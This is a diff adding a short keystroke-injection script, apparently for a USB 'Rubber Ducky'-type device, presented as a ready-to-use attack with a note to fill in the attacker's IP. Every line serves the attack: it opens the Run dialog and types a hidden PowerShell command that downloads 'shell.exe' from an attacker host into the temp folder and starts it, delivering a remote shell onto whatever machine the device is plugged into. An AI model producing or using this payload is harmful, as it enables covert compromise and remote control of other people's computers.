@@ -1,0 +1,7 @@
+# Replace your host IP first
+
+DELAY 2000
+GUI r
+DELAY 1000
+STRING powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('http://[your_IP]/shell.exe','%TEMP%\\shell.exe'); Start-Process "%TEMP%\\shell.exe"
+ENTER   
